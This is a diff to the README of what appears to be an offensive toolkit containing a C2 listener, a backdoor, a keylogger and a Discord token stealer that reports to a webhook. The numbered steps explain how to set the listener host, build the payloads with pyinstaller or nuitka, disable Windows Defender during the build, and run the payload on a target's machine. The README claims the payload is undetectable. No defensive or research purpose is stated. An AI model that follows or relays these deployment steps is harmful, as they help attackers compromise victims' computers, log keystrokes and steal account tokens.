@@ -44,9 +44,17 @@ C2 listener
 ```
 1. edit the host and the port for the listener.py and the backdoor.py
 optional: put your webhook in the discord.py file to recieve discord token
+
+
+
 2. install the requirements.txt using "pip3 install -r requirements.txt"
+
+
 3. and then "build" the backdoor.py and the keylogger.py using pyinstaller or nuitka to create the payload
-NOTE: windows 11 defender might detect and prevent the building process, so it is adviced that you stop windows defender, however the payload generated will still be undetectable
+NOTE: if you are building on windows 11, windows 11 defender might detect and prevent the building process, so it is adviced that you stop windows defender, however the payload generated will still be undetectable
+
+
+
 4. start the listener.py on your machine and execute the payload on the target machine
 ```
 
